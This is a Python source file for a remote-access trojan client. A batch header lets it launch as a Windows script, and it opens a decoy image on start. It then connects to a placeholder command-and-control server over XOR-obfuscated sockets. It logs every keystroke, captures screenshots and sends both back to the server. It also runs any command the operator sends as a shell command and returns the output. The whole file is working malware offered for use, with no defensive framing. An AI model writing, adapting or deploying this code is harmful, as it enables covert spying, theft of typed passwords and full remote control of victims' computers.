# @setlocal enabledelayedexpansion && python -x "%~f0" %* && exit /b
import socket
import json
import os
import sys
import time
import threading
import hashlib
import base64
import io
import subprocess
from pynput.keyboard import Listener
from PIL import ImageGrab

# --- Connection Settings ---
SERVER_HOST = "SERVER_IP"  # Replace with your server's IP address
SERVER_PORT = 8080
# XOR key used for lightweight traffic obfuscation
KEY = b'simple_xor_key'


# XOR encryption/decryption function
# Applies a repeating key to the payload bytes.
def xor_crypt(data: bytes) -> bytes:
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


# Send an encrypted JSON message to the server.
def send_msg(sock, obj):
    try:
        raw = json.dumps(obj).encode()
        enc = xor_crypt(raw)
        # Send the payload length as the first 4 bytes.
        length = len(enc).to_bytes(4, 'big')
        sock.sendall(length + enc)
    except:
        pass


# Receive and decrypt incoming messages from the server.
def recv_msg(sock):
    length_bytes = sock.recv(4)
    if not length_bytes: raise ConnectionError()
    length = int.from_bytes(length_bytes, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk: raise ConnectionError()
        data += chunk
    dec = xor_crypt(data)
    return json.loads(dec.decode('latin-1'))


# Compute the SHA-256 hash of a file.
# Sends the result back to the server.
def handle_hash(sock, filename):
    try:
        target = filename if filename else "logs.txt"
        if not os.path.exists(target):
            send_msg(sock, {"result": f"[-] Error: {target} not found."})
            return
        h = hashlib.sha256()
        with open(target, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        send_msg(sock, {"result": f"[+] SHA256 ({target}): {h.hexdigest()}"})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Hash error: {str(e)}"})


# Capture a screenshot and send it as base64-encoded data.
def handle_screencap(sock):
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG")
        img_str = base64.b64encode(buffer.getvalue()).decode()
        send_msg(sock, {"result": "[+] Screenshot captured!", "data": img_str})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Screenshot failed: {e}"})


# Keylogger thread: append keystrokes to a local file.
def start_keylogger():
    def on_press(key):
        with open("logs.txt", "a") as f:
            f.write(f"{key} ")

    with Listener(on_press=on_press) as listener:
        listener.join()


# Main connection loop and optional decoy image display.
def connecting():
    # Open the decoy image if it exists.
    if os.path.exists("image.jpg"):
        subprocess.Popen("start image.jpg", shell=True)

    while True:
        try:
            # Attempt connection to the C2 server
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))

            while True:
                msg = recv_msg(s)
                action = msg.get("action")

                # Terminate the client when requested.
                if action == "terminate":
                    s.close()
                    os._exit(0)

                # Send stored keystroke logs back to the server.
                elif action == "keylog":
                    if os.path.exists("logs.txt"):
                        with open("logs.txt", "r") as f:
                            send_msg(s, {"result": f.read()})
                    else:
                        send_msg(s, {"result": "[-] No logs found."})

                # Take a screenshot and transmit it.
                elif action == "screencap":
                    handle_screencap(s)

                # Calculate the requested file hash.
                elif action == "hash":
                    handle_hash(s, msg.get("filename"))

                # Execute any other shell command and return its output.
                else:
                    proc = subprocess.Popen(action, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    send_msg(s, {"result": result.decode('latin-1')})
        except:
            # Reconnect after a brief pause if the connection drops.
            time.sleep(10)


# Main entry point.
def main():
    # Start the keylogger in a separate thread so it does not block networking.
    t = threading.Thread(target=start_keylogger, daemon=True)
    t.start()
    # Start connection logic
    connecting()


if __name__ == "__main__":
    main()